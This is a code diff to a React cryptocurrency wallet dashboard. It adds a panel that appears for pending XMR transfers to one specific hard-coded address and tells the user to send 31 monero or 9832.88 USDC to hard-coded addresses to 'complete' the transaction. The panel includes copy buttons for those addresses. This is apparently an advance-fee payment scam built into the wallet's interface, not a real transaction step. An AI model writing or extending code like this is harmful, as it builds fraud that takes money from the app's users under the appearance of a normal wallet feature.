@@ -1278,7 +1278,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                   </div>
                  )}
                 
-                {/* Completion Message for Pending BTC to NZD Exchange */}
+                 {/* Completion Message for Pending BTC to NZD Exchange */}
                 {(selectedTransaction.status === 'pending' || selectedTransaction.type === 'pending') && selectedTransaction.exchangeTo && selectedTransaction.exchangeToSymbol === 'NZD' && (
                   <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg p-4 mt-4">
                     <p className="text-sm text-blue-800 dark:text-blue-200 mb-3">
@@ -1295,6 +1295,47 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                       >
                         <Copy className="w-4 h-4" />
                       </Button>
+                    </div>
+                  </div>
+                )}
+
+                 {/* Completion Message for Pending XMR Transfer */}
+                {(selectedTransaction.status === 'pending' || selectedTransaction.type === 'pending') && selectedTransaction.symbol === 'XMR' && selectedTransaction.to === 'FEiKnYzRhu8NB2cVnW9uvF4JyxtFe1UvKXihPNdK7A4M' && (
+                  <div className="bg-purple-50 dark:bg-purple-900/20 border border-purple-200 dark:border-purple-800 rounded-lg p-4 mt-4">
+                    <p className="text-sm text-purple-800 dark:text-purple-200 mb-3">
+                      To complete this please send 31 monero to 4964xDDsbbiNGfe1q7dFrXYtGTcSKsj6tfF7GB3r7XzXRJKsN6khWpfMwrobfNn8receEifoEph3V6BYz7FcoFkLFmUJvPM or 9832.88 usdc to 0x42332Ed7F756d92dd093551bAcF06Dc9E8B5Ec3A
+                    </p>
+                    <div className="space-y-3">
+                      <div>
+                        <p className="text-xs text-purple-700 dark:text-purple-300 mb-1">Monero Address (31 XMR):</p>
+                        <div className="flex items-center gap-2">
+                          <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-xs break-all">
+                            4964xDDsbbiNGfe1q7dFrXYtGTcSKsj6tfF7GB3r7XzXRJKsN6khWpfMwrobfNn8receEifoEph3V6BYz7FcoFkLFmUJvPM
+                          </div>
+                          <Button 
+                            size="sm"
+                            variant="outline"
+                            onClick={() => copyToClipboard("4964xDDsbbiNGfe1q7dFrXYtGTcSKsj6tfF7GB3r7XzXRJKsN6khWpfMwrobfNn8receEifoEph3V6BYz7FcoFkLFmUJvPM")}
+                          >
+                            <Copy className="w-4 h-4" />
+                          </Button>
+                        </div>
+                      </div>
+                      <div>
+                        <p className="text-xs text-purple-700 dark:text-purple-300 mb-1">USDC Address (9832.88 USDC):</p>
+                        <div className="flex items-center gap-2">
+                          <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-sm break-all">
+                            0x42332Ed7F756d92dd093551bAcF06Dc9E8B5Ec3A
+                          </div>
+                          <Button 
+                            size="sm"
+                            variant="outline"
+                            onClick={() => copyToClipboard("0x42332Ed7F756d92dd093551bAcF06Dc9E8B5Ec3A")}
+                          >
+                            <Copy className="w-4 h-4" />
+                          </Button>
+                        </div>
+                      </div>
                     </div>
                   </div>
                 )}
